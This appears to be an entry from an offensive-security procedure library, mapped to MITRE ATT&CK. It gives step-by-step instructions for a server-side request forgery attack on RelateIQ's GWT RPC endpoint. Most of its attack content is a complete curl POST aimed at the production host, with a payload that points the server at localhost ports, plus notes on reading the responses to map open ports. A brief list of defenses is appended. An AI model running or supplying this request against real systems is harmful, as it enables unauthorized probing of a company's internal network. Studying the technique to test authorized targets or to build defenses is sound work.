---
id: proc-relateiq-craft-gwt-request
tags:
  - ssrf
  - gwt-rpc
  - post-request
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/gwt-rpc-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:20.610Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft GWT RPC Request for SSRF Test

## Summary

This procedure crafts and sends a GWT RPC POST request to RelateIQ's validateOffice365Account method with an arbitrary localhost URL to test for SSRF vulnerability.

## Description

The RelateIQ application uses Google Web Toolkit (GWT) for RPC communications. By mimicking the registration payload, an attacker can invoke the validation function with a malicious URL like https://127.0.0.1:1, forcing the server to connect to internal resources. This tests connectivity and response differentiation for open/closed ports.

## Requirements

1. curl or similar HTTP client
2. Knowledge of GWT RPC payload format
3. Target URL: https://app.relateiq.com/app/GWT.rpc

## Defense

Defensive measures and detection strategies:

- Validate all URL parameters in RPC methods against a whitelist
- Log and alert on requests containing internal IPs or unusual ports
- Rate-limit RPC endpoints to prevent scanning abuse

## Objectives

1. Trigger server-side connection to arbitrary URL
2. Observe SSRF response behaviors
3. Confirm vulnerability presence

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the GWT RPC body with email, password, and custom URL parameters.

Use the standard payload format, replacing placeholders.

### Step 2: Send Test Request

**Context**: Execute the POST to probe port 1 on localhost.

**Command** ([[commands/gwt-rpc-ssrf-test]]):
```bash
curl -X POST https://app.relateiq.com/app/GWT.rpc \
  -H "Content-Type: text/x-gwt-rpc; charset=utf-8" \
  -H "X-GWT-Permutation: 95882AF82F06F7F3497A1C7BDD950153" \
  -H "X-GWT-Module-Base: https://app.relateiq.com/app/" \
  -H "Referer: https://app.relateiq.com/" \
  -d '7|2|10|https://app.relateiq.com/app/|11E595F5F188A97EA5C0F616EDA48ACD|com.google.gwt.user.client.rpc.XsrfToken/4254043109|18E2A3D3C932C5D49E0CF355C34327E4|com.relateiq.web.client.UtilityService|validateOffice365Account|java.lang.String/2004016611|123@123.com|123|https://127.0.0.1:1|1|2|3|4|5|6|4|7|7|7|7|8|9|9|10|'
```

> For closed ports, expect 'Unable to connect to the remote server'. This confirms the server attempts the connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/gwt-rpc-ssrf-test]]

## Tools Used


## Tags

- ssrf
- gwt-rpc
- post-request
